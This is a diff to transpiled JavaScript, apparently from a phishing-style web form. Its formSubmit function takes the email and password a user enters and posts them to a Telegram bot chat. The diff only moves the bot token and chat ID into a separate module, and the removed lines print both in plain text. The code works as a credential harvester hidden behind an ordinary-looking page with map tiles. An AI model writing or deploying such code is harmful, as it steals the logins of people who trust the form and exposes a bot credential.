@@ -1,5 +1,7 @@
 "use strict";
 
+var _tg_tokens = require("./tg_tokens.js");
+
 // download from https://leafletjs.com/
 // https://wiki.openstreetmap.org/wiki/Raster_tile_providers
 // https://medium.com/javarevisited/sending-a-message-to-a-telegram-channel-the-easy-way-eb0a0b32968
@@ -79,7 +81,7 @@ function validateForm(event) {
 }
 
 function formSubmit(event) {
-  var email, password, apiToken, chatId, text, urlString, response, resp;
+  var email, password, text, urlString, response, resp;
   return regeneratorRuntime.async(function formSubmit$(_context) {
     while (1) {
       switch (_context.prev = _context.next) {
@@ -96,11 +98,9 @@ function formSubmit(event) {
           return _context.abrupt("return", false);
 
         case 5:
-          apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
-          chatId = "-4066219312";
           text = "\n    <b>Email:</b> ".concat(email, "<b>Password</b> ").concat(password, "\n    ");
-          urlString = "https://api.telegram.org/bot".concat(apiToken, "/sendMessage");
-          _context.next = 11;
+          urlString = "https://api.telegram.org/bot".concat(_tg_tokens.apiToken, "/sendMessage");
+          _context.next = 9;
           return regeneratorRuntime.awrap(fetch(urlString, {
             method: 'post',
             headers: {
@@ -108,18 +108,18 @@ function formSubmit(event) {
               'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-              chat_id: chatId,
+              chat_id: _tg_tokens.chatId,
               text: text,
               parse_mode: 'HTML'
             })
           }));
 
-        case 11:
+        case 9:
           response = _context.sent;
-          _context.next = 14;
+          _context.next = 12;
           return regeneratorRuntime.awrap(response.json());
 
-        case 14:
+        case 12:
           resp = _context.sent;
           console.log(resp); // let request = new XMLHttpRequest();
           // request.open("GET", urlString);
@@ -127,7 +127,7 @@ function formSubmit(event) {
           // let response = request.response;
           // Do what you want with response
 
-        case 16:
+        case 14:
         case "end":
           return _context.stop();
       }
